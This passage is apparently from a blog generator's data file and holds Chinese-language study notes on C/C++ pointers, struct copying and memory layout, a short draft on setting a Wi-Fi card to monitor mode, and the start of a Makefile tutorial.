class=\"type\">int</span> age;</span><br><span class=\"line\">&#125;Student;</span><br><span class=\"line\">Student stu1 = &#123;<span class=\"string\">&quot;name&quot;</span>,<span class=\"number\">24</span>&#125;;<span class=\"comment\">//会报错</span></span><br><span class=\"line\"><span class=\"comment\">//从内存角度来看？</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">copyTo</span><span class=\"params\">(Student* stu1,Student *stu2)</span>&#123;</span><br><span class=\"line\">    *stu1 = *stu2;<span class=\"comment\">//指针的赋值运算是一个浅拷贝，即stu1 和 stu2的name变量不同，但是同时指向一个地址（即变量的值是同一个）因此当释放stu1.name后，stu1.name 值对应的那一块区域已经被释放了 ，如果继续释放stu2.name，就会出错误。</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>cpp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>静态局部变量在内存中存储于静态存储区.<br>在 C++ 程序运行时，内存通常划分为以下几个区域：<br>    1.    代码段（文本段）：存储程序的可执行代码。<br>    2.    全局数据区（静态存储区）：<br>    •    已初始化的全局变量和静态变量：存储在数据段。<br>    •    未初始化的全局变量和静态变量：存储在 BSS 段。<br>    3.    堆区：用于动态内存分配（如 new、malloc）。<br>    4.    栈区：用于存储函数的参数、返回地址和自动变量（非静态的局部变量）。<br>内存布局示意图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| 代码段（文本段）   |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|  已初始化的全局变量  |</span><br><span class=\"line\">|  和静态变量（数据段）|</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">| 未初始化的全局/静态变量 |</span><br><span class=\"line\">|    （BSS 段）     |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|       堆区        |</span><br><span class=\"line\">|  （向上增长）     |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|       栈区        |</span><br><span class=\"line\">|  （向下增长）     |</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n<h2 id=\"单例中的静态局部变量分析\"><a href=\"#单例中的静态局部变量分析\" class=\"headerlink\" title=\"单例中的静态局部变量分析\"></a>单例中的静态局部变量分析</h2><p>静态局部变量的存储区域</p>\n<p>•    未初始化的静态局部变量：存储在 .bss 段（未初始化数据段）。<br>•    已初始化的静态局部变量：存储在 .data 段（已初始化数据段）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> &#123;</span></span><br><span class=\"line\">public:</span><br><span class=\"line\">    <span class=\"type\">static</span> Singleton&amp; <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">static</span> Singleton instance; <span class=\"comment\">// 静态局部变量</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">    Singleton() &#123;&#125; <span class=\"comment\">// 私有构造函数</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n<ul>\n<li>instance 的声明：static Singleton instance;，这是一个未显式初始化的静态局部变量。</li>\n<li>存储位置：由于未显式初始化，instance 的内存空间被分配在 .bss 段。<br>•    初始化时机：<br>  •    内存分配：在程序加载时，instance 的内存空间被分配在 .bss 段。<br>  •    构造函数调用：在程序运行时，第一次调用 getInstance() 时，Singleton 的构造函数被调用，对 instance 进行初始化。<br>为什么存储在 .bss 段？</li>\n</ul>\n<p>.bss 段的特点<br>    •    存储未初始化的全局变量和静态变量。<br>    •    内存分配：在程序加载时，系统为 .bss 段分配内存，并自动将其初始化为零。<br>    •    优势：不需要在可执行文件中存储初始值，减小了文件大小。<br>内存布局示意图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| .bss 段          |</span><br><span class=\"line\">| - instance 的内存空间 (全零) |占用</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| .bss 段          |</span><br><span class=\"line\">| - instance 的内存空间 (已初始化) |</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n\n<p>explicit关键字<br><a href=\"https://www.cnblogs.com/rednodel/p/9299251.html\">https://www.cnblogs.com/rednodel/p/9299251.html</a></p>\n<p>显示声明构造函数，防止隐式转换</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>开发规范</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">int AndroidBitmap_getInfo(AndroidBitmapInfo* bitmapInfo)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">if(bitmapInfo == NULL)&#123;</span><br><span class=\"line\">    return -1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>1.通过指针在方法里赋值<br>2.一定要考虑健壮性<br>3.利用返回值进行异常抛出<br>4.不要修改传入的指针，可以加const ，及 AndroidBitMapInfo* const bitmapInfo</p>\n<p>二级指针<br>void set(char** str){<br>    *str = “test”;<br>}</p>\n<p>void main(){<br>    char* name = NULL;<br>    set(&amp;name);</p>\n<pre><code>printf(&quot;name = %s&quot;,name);\n</code></pre>\n<p>}<br>虽然NULL地址无法赋值，但是这里是没问题的<br>这里是没问题的，因为传入的是二级指针，所以<br>*str = “test”,改变的是name这个指针变量的值</p>\n<p>const 在c和cpp中的区别</p>\n<p>二级指针的内存模式</p>\n<p>指针数组：数组指针指向的数组元素的首地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">FILE</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* filename;</span><br><span class=\"line\">    <span class=\"type\">int</span> length;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* name =<span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//二级指针，看成二维数组</span></span><br><span class=\"line\">    <span class=\"type\">char</span>** nameP = &amp;name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//比如压缩文件，指定两个东西FILE ,一个是输入，一个是输出</span></span><br><span class=\"line\">    <span class=\"comment\">//定义一个FILE* 指针数组</span></span><br><span class=\"line\"></span><br><span class=\"line\">    FILE* file[<span class=\"number\">2</span>]=&#123;&#123;<span class=\"string\">&quot;in.mp4&quot;</span>&#125;,&#123;<span class=\"string\">&quot;out.mp4&quot;</span>&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    FILE** file1;<span class=\"comment\">//另外一种定义的方式（指针数组）（二级指针）其实是同一个概念，其实不是（栈中表现不同）</span></span><br><span class=\"line\">    <span class=\"comment\">//数组指针指向的是数组元素的首地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> number =<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span>* numberP = &amp;number;<span class=\"comment\">//一级指针，一级数组</span></span><br><span class=\"line\">    numberP++;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number is %d&quot;</span>,*numberP);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>//单独的来拿字符串数组来讲</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span>* name[<span class=\"number\">10</span>] = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>,<span class=\"string\">&quot;cccc&quot;</span>&#125;;<span class=\"comment\">//后面默认指向的是null指针 都是静态常量</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span>** name = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>&#125;;<span class=\"comment\">//报错</span></span><br><span class=\"line\">    <span class=\"comment\">//直接去赋值那么c和cpp的编译器会识别为二级指针，所以指针数组/二级指针不同</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">10</span>][<span class=\"number\">30</span>] = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>,<span class=\"string\">&quot;cccc&quot;</span>&#125;;<span class=\"comment\">//这几个都是从静态常量区copy到栈的buffer里面的</span></span><br><span class=\"line\">    <span class=\"comment\">//如果 name 用char** 去接 </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> len =<span class=\"number\">4</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>** params = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>*)*len);<span class=\"comment\">//开辟二维数组</span></span><br><span class=\"line\">    <span class=\"comment\">//开辟一维度数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">        params[i] = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>*)*<span class=\"number\">100</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//释放数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(params[i]!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">free</span>(params[i]);</span><br><span class=\"line\">            params[i]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(params!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(params);</span><br><span class=\"line\">        params=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结构提赋值<br>在c中等于相当于是内容赋值操作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> age;</span><br><span class=\"line\">&#125;Student;</span><br><span class=\"line\"></span><br><span class=\"line\">Student stu1 = &#123;<span class=\"string\">&quot;name&quot;</span>,<span class=\"number\">24</span>&#125;;</span><br><span class=\"line\">Student stu2;</span><br><span class=\"line\">stu2 = stu1;<span class=\"comment\">// = 赋值的操作，java中stu2对象会变成stu1,但是c中不会，stu1 和 stu2是不同的结构体 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//但是如果结构体是</span></span><br><span class=\"line\">tydef <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">    <span class=\"type\">int</span> age;</span><br><span class=\"line\">&#125;Student;</span><br><span class=\"line\">Student stu1 = &#123;<span class=\"string\">&quot;name&quot;</span>,<span class=\"number\">24</span>&#125;;<span class=\"comment\">//会报错</span></span><br><span class=\"line\"><span class=\"comment\">//从内存角度来看？</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">copyTo</span><span class=\"params\">(Student* stu1,Student *stu2)</span>&#123;</span><br><span class=\"line\">    *stu1 = *stu2;<span class=\"comment\">//指针的赋值运算是一个浅拷贝，即stu1 和 stu2的name变量不同，但是同时指向一个地址（即变量的值是同一个）因此当释放stu1.name后，stu1.name 值对应的那一块区域已经被释放了 ，如果继续释放stu2.name，就会出错误。</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>cpp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>静态局部变量在内存中存储于静态存储区.<br>在 C++ 程序运行时，内存通常划分为以下几个区域：<br>    1.    代码段（文本段）：存储程序的可执行代码。<br>    2.    全局数据区（静态存储区）：<br>    •    已初始化的全局变量和静态变量：存储在数据段。<br>    •    未初始化的全局变量和静态变量：存储在 BSS 段。<br>    3.    堆区：用于动态内存分配（如 new、malloc）。<br>    4.    栈区：用于存储函数的参数、返回地址和自动变量（非静态的局部变量）。<br>内存布局示意图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| 代码段（文本段）   |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|  已初始化的全局变量  |</span><br><span class=\"line\">|  和静态变量（数据段）|</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">| 未初始化的全局/静态变量 |</span><br><span class=\"line\">|    （BSS 段）     |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|       堆区        |</span><br><span class=\"line\">|  （向上增长）     |</span><br><span class=\"line\">+------------------+</span><br><span class=\"line\">|       栈区        |</span><br><span class=\"line\">|  （向下增长）     |</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n<h2 id=\"单例中的静态局部变量分析\"><a href=\"#单例中的静态局部变量分析\" class=\"headerlink\" title=\"单例中的静态局部变量分析\"></a>单例中的静态局部变量分析</h2><p>静态局部变量的存储区域</p>\n<p>•    未初始化的静态局部变量：存储在 .bss 段（未初始化数据段）。<br>•    已初始化的静态局部变量：存储在 .data 段（已初始化数据段）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Singleton</span> &#123;</span></span><br><span class=\"line\">public:</span><br><span class=\"line\">    <span class=\"type\">static</span> Singleton&amp; <span class=\"title function_\">getInstance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">static</span> Singleton instance; <span class=\"comment\">// 静态局部变量</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private:</span><br><span class=\"line\">    Singleton() &#123;&#125; <span class=\"comment\">// 私有构造函数</span></span><br><span class=\"line\">&#125;; </span><br></pre></td></tr></table></figure>\n<ul>\n<li>instance 的声明：static Singleton instance;，这是一个未显式初始化的静态局部变量。</li>\n<li>存储位置：由于未显式初始化，instance 的内存空间被分配在 .bss 段。<br>•    初始化时机：<br>  •    内存分配：在程序加载时，instance 的内存空间被分配在 .bss 段。<br>  •    构造函数调用：在程序运行时，第一次调用 getInstance() 时，Singleton 的构造函数被调用，对 instance 进行初始化。<br>为什么存储在 .bss 段？</li>\n</ul>\n<p>.bss 段的特点<br>    •    存储未初始化的全局变量和静态变量。<br>    •    内存分配：在程序加载时，系统为 .bss 段分配内存，并自动将其初始化为零。<br>    •    优势：不需要在可执行文件中存储初始值，减小了文件大小。<br>内存布局示意图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| .bss 段          |</span><br><span class=\"line\">| - instance 的内存空间 (全零) |占用</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+</span><br><span class=\"line\">| .bss 段          |</span><br><span class=\"line\">| - instance 的内存空间 (已初始化) |</span><br><span class=\"line\">+------------------+</span><br></pre></td></tr></table></figure>\n\n<p>explicit关键字<br><a href=\"https://www.cnblogs.com/rednodel/p/9299251.html\">https://www.cnblogs.com/rednodel/p/9299251.html</a></p>\n<p>显示声明构造函数，防止隐式转换</p>\n"},{"_content":"网卡设置为监控模式\nsudo ip link set wlx3476c53ad55b down\nsudo iw wlx3476c53ad55b set type monitor\nsudo ip link set wlx3476c53ad55b up","source":"_drafts/net.md","raw":"网卡设置为监控模式\nsudo ip link set wlx3476c53ad55b down\nsudo iw wlx3476c53ad55b set type monitor\nsudo ip link set wlx3476c53ad55b up","slug":"net","published":0,"date":"2025-06-29T15:21:27.922Z","updated":"2025-06-29T15:21:47.253Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000ev8fy7mah8b7d","content":"<p>网卡设置为监控模式<br>sudo ip link set wlx3476c53ad55b down<br>sudo iw wlx3476c53ad55b set type monitor<br>sudo ip link set wlx3476c53ad55b up</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>网卡设置为监控模式<br>sudo ip link set wlx3476c53ad55b down<br>sudo iw wlx3476c53ad55b set type monitor<br>sudo ip link set wlx3476c53ad55b up</p>\n"},{"_content":"下面整理了一份较为完整的 Makefile 教程，从基础语法、变量、目标与规则，到一些高级用法和注意事项，帮助你快速入门 GNU Make 以及编写高效的 Makefile。\n\n1. Makefile 基础\n\nMakefile 是一个用来自动构建程序的脚本文件，主要由 目标(target)、依赖(dependency) 和 命令(command) 组成。Make 工具根据 Makefile 指定的规则自动判断哪些文件需要重新构建。\n\n基本语法格式：\n\n目标: 依赖1 依赖2 ...\n\t命令\n\n\t•\t目标：通常是可执行文件、库或其他需要生成的文件，也可以是伪目标（例如 clean）。\n\t•\t依赖：构成目标所需的文件或目标列表。如果依赖比目标更新，则目标需要重新生成。\n\t•\t命令：实际执行的 shell 命令，用于生成目标。注意：命令行前必须以 Tab 字符开始（空格不行）。\n\n示例：\n\nhello: hello.c\n\tgcc -o hello hello.c\n\n上述规则表示：当 hello 文件需要生成时，如果 hello.c 是比 hello 更新的（或 hello 不存在），就用 gcc -o hello hello.c 命令生成。\n\n2. 变量的使用\n\nMakefile 中可以定义变量，以便在多个地方复用相同的内容。\n\n变量定义：\n\t•\t使用等号 =（延迟展开）或 :=（立即展开）定义变量。\n\nCC := gcc\nCFLAGS := -Wall -O2\nSRC := main.c utils.c\nOBJ := main.o utils.o\n\n变量引用：\n\t•\t使用 $() 或 ${} 语法引用变量，它们是等价的。例如：\n\t•\t$(CC) 或 ${CC}\n\t•\t当变量名与其他字符紧挨在一起时，使用 ${} 更清晰：\n\n${OBJ}_backup  # 表示变量 OBJ 的值后面接 _backup 字符串\n\n\n\n示例：\n\nall: myprog\n\nmyprog: $(OBJ)\n\t$(CC) $(CFLAGS) -o $@ $^\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n\t•\t$@：表示当前规则中的目标文件名。\n\t•\t$<：表示当前规则中的第一个依赖文件。\n\t•\t$^：表示当前规则中的所有依赖文件（去除重复项）。\n\n3. 目标、依赖和命令规则\n\n多个目标和依赖：\n\t•\t一个目标可以有多个依赖文件：\n\nmyprog: main.o utils.o lib.o\n\t$(CC) -o myprog main.o utils.o lib.o\n\n\n\n伪目标（Phony Targets）：\n\t•\t伪目标不会生成实际文件，比如 clean、all、install 等，可以用 .PHONY 声明：\n\n.PHONY: clean\nclean:\n\trm -f myprog *.o\n\n\n\n自动化变量：\n\t•\t自动变量使规则编写更简洁：\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n这里 % 表示通配符，匹配文件的相同部分。\n\n4. 常用的函数和高级特性\n\nGNU Make 提供了丰富的函数和高级特性，可以用来进行字符串操作、条件判断、循环等。\n\n字符串替换函数 $(subst from,to,text)：\n\nFILES := file1.c file2.c file3.c\nOBJS := $(subst .c,.o,$(FILES))\n\n条件判断：\n\nifeq ($(DEBUG),1)\n    CFLAGS += -g\nelse\n    CFLAGS += -O2\nendif\n\n包含其他 Makefile 文件：\n\ninclude config.mk\n\n模式规则（Pattern Rules）：\n\t•\t用于定义通用构建规则：\n\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n\n\n内置目标：\n\t•\tGNU Make 内置了一些特殊目标，例如 .PHONY、.SUFFIXES、.DEFAULT 等，可用于调整行为。\n\n5. 完整示例：编译一个小程序\n\n下面给出一个简单示例 Makefile，假设项目包含源文件 main.c 和 utils.c，目标为生成可执行文件 myprog。\n\n# Makefile 示例\n\n# 定义变量\nCC := gcc\nCFLAGS := -Wall -O2\nSRC := main.c utils.c\nOBJ := $(SRC:.c=.o)    # 使用模式替换，将 .c 转为 .o\nTARGET := myprog\n\n# 默认目标\nall: $(TARGET)\n\n# 目标生成规则：链接目标文件生成可执行文件\n$(TARGET): $(OBJ)\n\t$(CC) $(CFLAGS) -o $@ $^\n\n# 模式规则：将 .c 文件编译为 .o 文件\n%.o: %.c\n\t$(CC) $(CFLAGS) -c $< -o $@\n\n# 清理构建生成的文件\n.PHONY: clean\nclean:\n\trm -f $(TARGET) $(OBJ)\n\n# 安装目标（可选）\n.PHONY: install\ninstall: $(TARGET)\n\tinstall -m 755 $(TARGET) /usr/local/bin/\n\n说明：\n\t•\t变量 SRC 定义了所有的源代码文件。\n\t•\t变量 OBJ 利用模式替换，将每个 .c 文件自动转换成对应的 .o 文件。\n\t•\t默认目标 all 依赖目标可执行文件 myprog。\n\t•\t自动化变量 $@ 表示目标文件名字， $^ 表示所有依赖文件， $< 表示第一个依赖文件。\n\t•\t.PHONY 用来声明伪目标 clean 和 install，确保这些目标总会执行对应命令，而不会与同名文件冲突。\n\n6. 调试和调优\n\n打印变量值：\n\t•\t可使用 $(info ) 函数打印变量值：\n\n$(info SRC = $(SRC))\n\n\n\n使用 make -n 或 make --dry-run\n\t•\t可模拟执行，查看 Makefile 各条命令，帮助调试构建过程。\n\n启用详细输出：\n\t•\t执行 make V=1 有时可帮助观察命令实际执行细节（具体与项目设定有关）。\n\n7. 总结\n\t•\t目标、依赖和命令构成了 Makefile 的基本单元。\n\t•\t使用变量和自动变量简化编写工作，便于维护。\n\t•\t利用模式规则、条件判断、内置函数等高级特性可以编写通用、灵活的构建脚本。\n\t•\t记得在命令行前使用 Tab 缩进，否则会导致错误。\n\n通过不断调试和修改，你可以编写出适应各种工程需求的 Makefile。希望这份教程能帮助你快速上手 GNU Make 工具！","source":"_drafts/makefile.md","raw":"下面整理了一份较为完整的 Makefile 教程，从基础语法、变量、目标与规则，到一些高级用法和注意事项，帮助你快速入门 GNU Make 以及编写高效的 Makefile。\n\n1. Makefile 基础\n\nMakefile 是一个用来自动构建程序的脚本文件，主要由 目标(target)、依赖(dependency) 和 命令(command) 组成。Make 工具根据 Makefile 指定的规则自动判断哪些文件需要重新构建。\n\n基本语法格式：\n\n目标: 依赖1 依赖2 ...\n\t命令\n\n\t•\t目标：通常是可执行文件、库或其他需要生成的文件，也可以是伪目标（例如 clean）。\n\t•\t依赖：构成目标所需的文件或目标列表。如果依赖比目标更新，则目标需要重新生成。\n\t•\t命令：实际执行的 shell 命令，用于生成目标。注意：命令行前必须以 Tab 字符开始（空格不行）。\n\n示例：\n\nhello: hello.c\n\tgcc -o hello hello.c\n\n上述规则表示：当 hello 文件需要生成时，如果 hello.c 是比 hello 更新的（或 hello 不存在），就用 gcc -o hello hello.c 命令生成。\n\n2. 变量的使用\n\nMakefile 中可以定义变量，以便在多个地方复用相同的内容。\n\n变量定义：\n\t•\t使用等号 =（延迟展开）或 :=（立即展开）定义变量。\n\nCC := gcc\nCFLAGS := -Wall -O2\nSRC := main.c utils.c\nOBJ := main.o utils.o\n\n变量引用：\n\t•\t使用 $() 或 ${} 语法引用变量，它们是等价的。例如：\n\t•\t$(CC) 或 ${CC}\n\t•\t当变量名与其他字符紧挨在一起时，使用 